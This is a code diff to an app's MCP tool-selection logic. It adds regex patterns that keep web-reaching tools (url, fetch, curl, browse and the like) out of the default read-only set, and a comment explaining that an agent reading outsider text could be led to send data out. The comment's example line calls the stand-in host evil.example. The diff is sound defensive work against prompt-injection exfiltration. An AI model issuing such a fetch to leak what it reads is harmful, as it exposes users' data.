@@ -21,7 +21,9 @@ import { redactSecrets } from './provider.ts'
  * kept by the CredentialService (OS keychain) and never sent to the renderer.
  *
  * Tools can have side effects, so only tools that look read-only are offered unless the user picks others: the
- * server's readOnlyHint, or a name like get_/list_/search_ when the server does not say.
+ * server's readOnlyHint, or a name like get_/list_/search_ when the server does not say. A tool that reaches any
+ * address on the web is left out too, read-only or not: "fetch evil.example/?q=<what you read>" sends data out
+ * without writing anything. A run with text from outsiders gets no MCP tools at all (see the runner).
  */
 
 interface StoredTool {
@@ -69,8 +71,13 @@ const READ_VERB =
 const WRITE_VERB =
 	/(^|[_\-.])(create|update|delete|remove|write|post|send|set|add|edit|merge|close|reopen|comment|assign|transition|move|upload|run|exec|execute|apply|approve|publish|push|start|stop|cancel|archive|rename|invite|reply)([_\-.]|$)/i
 
+const WEB_NAME =
+	/(^|[_\-.])(url|urls|http|https|web|webpage|website|browse|browser|navigate|download|scrape|crawl|curl|request)([_\-.]|$)|^fetch$/i
+const WEB_DESCRIPTION = /\b(any|arbitrary|a given) (url|web ?page|website|address)\b|\bfetch(es|ing)? (a |the |any )?(url|web ?page)/i
+
 /** Whether a tool is offered when the user has not picked tools for its server. */
-export function looksReadOnly(t: Pick<StoredTool, 'name' | 'readOnly' | 'destructive'>): boolean {
+export function looksReadOnly(t: Pick<StoredTool, 'name' | 'readOnly' | 'destructive'> & { description?: string }): boolean {
+	if (WEB_NAME.test(t.name) || WEB_DESCRIPTION.test(t.description ?? '')) return false
 	if (t.readOnly === true) return true
 	if (t.readOnly === false || t.destructive === true) return false
 	return READ_VERB.test(t.name) && !WRITE_VERB.test(t.name)
